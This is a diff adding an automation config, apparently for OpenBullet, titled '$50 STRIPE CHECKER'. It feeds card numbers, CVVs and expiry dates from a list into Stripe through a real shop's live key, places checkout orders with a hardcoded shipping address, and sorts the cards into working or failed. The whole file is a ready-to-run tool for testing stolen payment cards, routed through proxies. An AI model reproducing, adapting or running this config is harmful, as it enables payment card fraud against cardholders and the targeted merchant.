@@ -1,0 +1,409 @@
+[SETTINGS]
+{
+  "Name": "$50 STRIPE CHECKER",
+  "SuggestedBots": 15,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-03T04:14:24.7085236-08:00",
+  "AdditionalInfo": "@MasterLordBoss",
+  "Author": "@MasterLordConfigs",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "1$REQ",
+  "AllowedWordlist2": "1$REQ",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "JOIN > @MasterLordConfigs",
+      "VariableName": "",
+      "Id": 1340057065
+    },
+    {
+      "Description": "Config Made By > @MasterLordBoss",
+      "VariableName": "",
+      "Id": 683235283
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "guid" 
+
+FUNCTION GenerateGUID -> VAR "muid" 
+
+FUNCTION GenerateGUID -> VAR "sid" 
+
+REQUEST GET "https://randomuser.me/api/?nat=us" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "first" -> VAR "first" 
+
+PARSE "<SOURCE>" JSON "last" -> VAR "last" 
+
+FUNCTION Constant "<first> <last>" -> VAR "Name" 
+
+PARSE "<SOURCE>" JSON "country" -> VAR "cod" 
+
+FUNCTION Translate 
+  KEY "Afghanistan" VALUE "AF" 
+  KEY "Ã…land Islands" VALUE "AX" 
+  KEY "Albania" VALUE "AL" 
+  KEY "Algeria" VALUE "DZ" 
+  KEY "American Samoa" VALUE "AS" 
+  KEY "Andorra" VALUE "AD" 
+  KEY "Angola" VALUE "AO" 
+  KEY "Anguilla" VALUE "AI" 
+  KEY "Antarctica" VALUE "AQ" 
+  KEY "Antigua and Barbuda" VALUE "AG" 
+  KEY "Argentina" VALUE "AR" 
+  KEY "Armenia" VALUE "AM" 
+  KEY "Aruba" VALUE "AW" 
+  KEY "Australia" VALUE "AU" 
+  KEY "Austria" VALUE "AT" 
+  KEY "Azerbaijan" VALUE "AZ" 
+  KEY "Bahamas" VALUE "BS" 
+  KEY "Bahrain" VALUE "BH" 
+  KEY "Bangladesh" VALUE "BD" 
+  KEY "Barbados" VALUE "BB" 
+  KEY "Belarus" VALUE "BY" 
+  KEY "Belgium" VALUE "BE" 
+  KEY "Belize" VALUE "BZ" 
+  KEY "Benin" VALUE "BJ" 
+  KEY "Bermuda" VALUE "BM" 
+  KEY "Bhutan" VALUE "BT" 
+  KEY "Bolivia" VALUE "Plurinational State of: BO" 
+  KEY "Bonaire" VALUE "Sint Eustatius and Saba: BQ" 
+  KEY "Bosnia and Herzegovina" VALUE "BA" 
+  KEY "Botswana" VALUE "BW" 
+  KEY "Bouvet Island" VALUE "BV" 
+  KEY "Brazil" VALUE "BR" 
+  KEY "British Indian Ocean Territory" VALUE "IO" 
+  KEY "Brunei Darussalam" VALUE "BN" 
+  KEY "Bulgaria" VALUE "BG" 
+  KEY "Burkina Faso" VALUE "BF" 
+  KEY "Burundi" VALUE "BI" 
+  KEY "Cambodia" VALUE "KH" 
+  KEY "Cameroon" VALUE "CM" 
+  KEY "Canada" VALUE "CA" 
+  KEY "Cape Verde" VALUE "CV" 
+  KEY "Cayman Islands" VALUE "KY" 
+  KEY "Central African Republic" VALUE "CF" 
+  KEY "Chad" VALUE "TD" 
+  KEY "Chile" VALUE "CL" 
+  KEY "China" VALUE "CN" 
+  KEY "Christmas Island" VALUE "CX" 
+  KEY "Cocos (Keeling) Islands" VALUE "CC" 
+  KEY "Colombia" VALUE "CO" 
+  KEY "Comoros" VALUE "KM" 
+  KEY "Congo" VALUE "the Democratic Republic of the: CD" 
+  KEY "Cook Islands" VALUE "CK" 
+  KEY "Costa Rica" VALUE "CR" 
+  KEY "CÃ´te d'Ivoire" VALUE "CI" 
+  KEY "Croatia" VALUE "HR" 
+  KEY "Cuba" VALUE "CU" 
+  KEY "CuraÃ§ao" VALUE "CW" 
+  KEY "Cyprus" VALUE "CY" 
+  KEY "Czech Republic" VALUE "CZ" 
+  KEY "Denmark" VALUE "DK" 
+  KEY "Djibouti" VALUE "DJ" 
+  KEY "Dominica" VALUE "DM" 
+  KEY "Dominican Republic" VALUE "DO" 
+  KEY "Ecuador" VALUE "EC" 
+  KEY "Egypt" VALUE "EG" 
+  KEY "El Salvador" VALUE "SV" 
+  KEY "Equatorial Guinea" VALUE "GQ" 
+  KEY "Eritrea" VALUE "ER" 
+  KEY "Estonia" VALUE "EE" 
+  KEY "Ethiopia" VALUE "ET" 
+  KEY "Falkland Islands (Malvinas)" VALUE "FK" 
+  KEY "Faroe Islands" VALUE "FO" 
+  KEY "Fiji" VALUE "FJ" 
+  KEY "Finland" VALUE "FI" 
+  KEY "France" VALUE "FR" 
+  KEY "French Guiana" VALUE "GF" 
+  KEY "French Polynesia" VALUE "PF" 
+  KEY "French Southern Territories" VALUE "TF" 
+  KEY "Gabon" VALUE "GA" 
+  KEY "Gambia" VALUE "GM" 
+  KEY "Georgia" VALUE "GE" 
+  KEY "Germany" VALUE "DE" 
+  KEY "Ghana" VALUE "GH" 
+  KEY "Gibraltar" VALUE "GI" 
+  KEY "Greece" VALUE "GR" 
+  KEY "Greenland" VALUE "GL" 
+  KEY "Grenada" VALUE "GD" 
+  KEY "Guadeloupe" VALUE "GP" 
+  KEY "Guam" VALUE "GU" 
+  KEY "Guatemala" VALUE "GT" 
+  KEY "Guernsey" VALUE "GG" 
+  KEY "Guinea" VALUE "GN" 
+  KEY "Guinea-Bissau" VALUE "GW" 
+  KEY "Guyana" VALUE "GY" 
+  KEY "Haiti" VALUE "HT" 
+  KEY "Heard Island and McDonald Islands" VALUE "HM" 
+  KEY "Holy See (Vatican City State)" VALUE "VA" 
+  KEY "Honduras" VALUE "HN" 
+  KEY "Hong Kong" VALUE "HK" 
+  KEY "Hungary" VALUE "HU" 
+  KEY "Iceland" VALUE "IS" 
+  KEY "India" VALUE "IN" 
+  KEY "Indonesia" VALUE "ID" 
+  KEY "Iran" VALUE "Islamic Republic of: IR" 
+  KEY "Iraq" VALUE "IQ" 
+  KEY "Ireland" VALUE "IE" 
+  KEY "Isle of Man" VALUE "IM" 
+  KEY "Israel" VALUE "IL" 
+  KEY "Italy" VALUE "IT" 
+  KEY "Jamaica" VALUE "JM" 
+  KEY "Japan" VALUE "JP" 
+  KEY "Jersey" VALUE "JE" 
+  KEY "Jordan" VALUE "JO" 
+  KEY "Kazakhstan" VALUE "KZ" 
+  KEY "Kenya" VALUE "KE" 
+  KEY "Kiribati" VALUE "KI" 
+  KEY "Korea" VALUE "Republic of: KR" 
+  KEY "Kuwait" VALUE "KW" 
+  KEY "Kyrgyzstan" VALUE "KG" 
+  KEY "Lao People's Democratic Republic" VALUE "LA" 
+  KEY "Latvia" VALUE "LV" 
+  KEY "Lebanon" VALUE "LB" 
+  KEY "Lesotho" VALUE "LS" 
+  KEY "Liberia" VALUE "LR" 
+  KEY "Libya" VALUE "LY" 
+  KEY "Liechtenstein" VALUE "LI" 
+  KEY "Lithuania" VALUE "LT" 
+  KEY "Luxembourg" VALUE "LU" 
+  KEY "Macao" VALUE "MO" 
+  KEY "Macedonia" VALUE "the Former Yugoslav Republic of: MK" 
+  KEY "Madagascar" VALUE "MG" 
+  KEY "Malawi" VALUE "MW" 
+  KEY "Malaysia" VALUE "MY" 
+  KEY "Maldives" VALUE "MV" 
+  KEY "Mali" VALUE "ML" 
+  KEY "Malta" VALUE "MT" 
+  KEY "Marshall Islands" VALUE "MH" 
+  KEY "Martinique" VALUE "MQ" 
+  KEY "Mauritania" VALUE "MR" 
+  KEY "Mauritius" VALUE "MU" 
+  KEY "Mayotte" VALUE "YT" 
+  KEY "Mexico" VALUE "MX" 
+  KEY "Micronesia" VALUE "Federated States of: FM" 
+  KEY "Moldova" VALUE "Republic of: MD" 
+  KEY "Monaco" VALUE "MC" 
+  KEY "Mongolia" VALUE "MN" 
+  KEY "Montenegro" VALUE "ME" 
+  KEY "Montserrat" VALUE "MS" 
+  KEY "Morocco" VALUE "MA" 
+  KEY "Mozambique" VALUE "MZ" 
+  KEY "Myanmar" VALUE "MM" 
+  KEY "Namibia" VALUE "NA" 
+  KEY "Nauru" VALUE "NR" 
+  KEY "Nepal" VALUE "NP" 
+  KEY "Netherlands" VALUE "NL" 
+  KEY "New Caledonia" VALUE "NC" 
+  KEY "New Zealand" VALUE "NZ" 
+  KEY "Nicaragua" VALUE "NI" 
+  KEY "Niger" VALUE "NE" 
+  KEY "Nigeria" VALUE "NG" 
+  KEY "Niue" VALUE "NU" 
+  KEY "Norfolk Island" VALUE "NF" 
+  KEY "Northern Mariana Islands" VALUE "MP" 
+  KEY "Norway" VALUE "NO" 
+  KEY "Oman" VALUE "OM" 
+  KEY "Pakistan" VALUE "PK" 
+  KEY "Palau" VALUE "PW" 
+  KEY "Palestine" VALUE "State of: PS" 
+  KEY "Panama" VALUE "PA" 
+  KEY "Papua New Guinea" VALUE "PG" 
+  KEY "Paraguay" VALUE "PY" 
+  KEY "Peru" VALUE "PE" 
+  KEY "Philippines" VALUE "PH" 
+  KEY "Pitcairn" VALUE "PN" 
+  KEY "Poland" VALUE "PL" 
+  KEY "Portugal" VALUE "PT" 
+  KEY "Puerto Rico" VALUE "PR" 
+  KEY "Qatar" VALUE "QA" 
+  KEY "RÃ©union" VALUE "RE" 
+  KEY "Romania" VALUE "RO" 
+  KEY "Russian Federation" VALUE "RU" 
+  KEY "Rwanda" VALUE "RW" 
+  KEY "Saint BarthÃ©lemy" VALUE "BL" 
+  KEY "Saint Helena" VALUE "Ascension and Tristan da Cunha: SH" 
+  KEY "Saint Kitts and Nevis" VALUE "KN" 
+  KEY "Saint Lucia" VALUE "LC" 
+  KEY "Saint Martin (French part)" VALUE "MF" 
+  KEY "Saint Pierre and Miquelon" VALUE "PM" 
+  KEY "Saint Vincent and the Grenadines" VALUE "VC" 
+  KEY "Samoa" VALUE "WS" 
+  KEY "San Marino" VALUE "SM" 
+  KEY "Sao Tome and Principe" VALUE "ST" 
+  KEY "Saudi Arabia" VALUE "SA" 
+  KEY "Senegal" VALUE "SN" 
+  KEY "Serbia" VALUE "RS" 
+  KEY "Seychelles" VALUE "SC" 
+  KEY "Sierra Leone" VALUE "SL" 
+  KEY "Singapore" VALUE "SG" 
+  KEY "Sint Maarten (Dutch part)" VALUE "SX" 
+  KEY "Slovakia" VALUE "SK" 
+  KEY "Slovenia" VALUE "SI" 
+  KEY "Solomon Islands" VALUE "SB" 
+  KEY "Somalia" VALUE "SO" 
+  KEY "South Africa" VALUE "ZA" 
+  KEY "South Georgia and the South Sandwich Islands" VALUE "GS" 
+  KEY "South Sudan" VALUE "SS" 
+  KEY "Spain" VALUE "ES" 
+  KEY "Sri Lanka" VALUE "LK" 
+  KEY "Sudan" VALUE "SD" 
+  KEY "Suriname" VALUE "SR" 
+  KEY "Svalbard and Jan Mayen" VALUE "SJ" 
+  KEY "Swaziland" VALUE "SZ" 
+  KEY "Sweden" VALUE "SE" 
+  KEY "Switzerland" VALUE "CH" 
+  KEY "Syrian Arab Republic" VALUE "SY" 
+  KEY "Taiwan" VALUE "Province of China: TW" 
+  KEY "Tajikistan" VALUE "TJ" 
+  KEY "Tanzania" VALUE "United Republic of: TZ" 
+  KEY "Thailand" VALUE "TH" 
+  KEY "Timor-Leste" VALUE "TL" 
+  KEY "Togo" VALUE "TG" 
+  KEY "Tokelau" VALUE "TK" 
+  KEY "Tonga" VALUE "TO" 
+  KEY "Trinidad and Tobago" VALUE "TT" 
+  KEY "Tunisia" VALUE "TN" 
+  KEY "Turkey" VALUE "TR" 
+  KEY "Turkmenistan" VALUE "TM" 
+  KEY "Turks and Caicos Islands" VALUE "TC" 
+  KEY "Tuvalu" VALUE "TV" 
+  KEY "Uganda" VALUE "UG" 
+  KEY "Ukraine" VALUE "UA" 
+  KEY "United Arab Emirates" VALUE "AE" 
+  KEY "United Kingdom" VALUE "GB" 
+  KEY "United States" VALUE "US" 
+  KEY "United States Minor Outlying Islands" VALUE "UM" 
+  KEY "Uruguay" VALUE "UY" 
+  KEY "Uzbekistan" VALUE "UZ" 
+  KEY "Vanuatu" VALUE "VU" 
+  KEY "Venezuela" VALUE "Bolivarian Republic of: VE" 
+  KEY "Viet Nam" VALUE "VN" 
+  KEY "Virgin Islands" VALUE "U.S.: VI" 
+  KEY "Wallis and Futuna" VALUE "WF" 
+  KEY "Western Sahara" VALUE "EH" 
+  KEY "Yemen" VALUE "YE" 
+  KEY "Zambia" VALUE "ZM" 
+  KEY "Zimbabwe" VALUE "ZW" 
+  "<cod>" -> VAR "Country" 
+
+PARSE "<SOURCE>" JSON "postcode" -> VAR "Zip" 
+
+REQUEST GET "https://www.woolnut.com/shop/accessories/card-holder/card-holder-black/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://www.woolnut.com/?wc-ajax=add_to_cart" 
+  CONTENT "product_id=5282&quantity=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://www.woolnut.com" 
+  HEADER "referer: https://www.woolnut.com/shop/accessories/card-holder/card-holder-black/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 26" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+
+#SOURCES REQUEST POST "https://api.stripe.com/v1/sources" 
+  CONTENT "type=card&owner[name]=<Name>&owner[address][line1]=<Street>&owner[address][state]=<State>&owner[address][city]=<City>&owner[address][postal_code]=<Zip>&owner[address][country]=<Country>&owner[email]=peshangsalam%40gmail.com&owner[phone]=7701669021&card[number]=<cc>&card[cvc]=<cvv>&card[exp_month]=<mes>&card[exp_year]=<ano>&guid=<guid>&muid=<muid>&sid=<sid>&payment_user_agent=stripe.js%2F37725c4fd%3B+stripe-js-v3%2F37725c4fd&time_on_page=25750&key=pk_live_43m2F4lnvDdBhh25miMwWLbs" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 608" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://js.stripe.com" 
+  HEADER "referer: https://js.stripe.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "id\": \"" "\"" -> VAR "ID" 
+
+REQUEST POST "https://www.woolnut.com/?wc-ajax=checkout" 
+  CONTENT "billing_first_name=<first>&billing_last_name=<last>&billing_company=&billing_country=<Country>&billing_address_1=<Street>&billing_address_2=&billing_city=<City>&billing_state=NJ&billing_postcode=<Zip>&billing_phone=7701669021&billing_email=peshangsalam%40gmail.com&vat_number=&ship_to_different_address=1&shipping_first_name=Master&shipping_last_name=Lord&shipping_company=&shipping_country=US&shipping_address_1=198+White+Horse+Pike&shipping_address_2=&shipping_city=West+Cape+May&shipping_state=NJ&shipping_postcode=08107&shipping_method%5B0%5D=flat_rate%3A22&payment_method=stripe&woocommerce-process-checkout-nonce=e4e7954a80&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source=<ID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "origin: https://www.woolnut.com" 
+  HEADER "referer: https://www.woolnut.com/checkout/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"result\":\"failure\"" 
+  KEYCHAIN Success OR 
+    KEY "\"result\":\"success\"" 
+    KEY "Thank you" 
+
+#CREATOR FUNCTION Constant "@MasterLordBoss" -> CAP "CONFIG BY" 
+
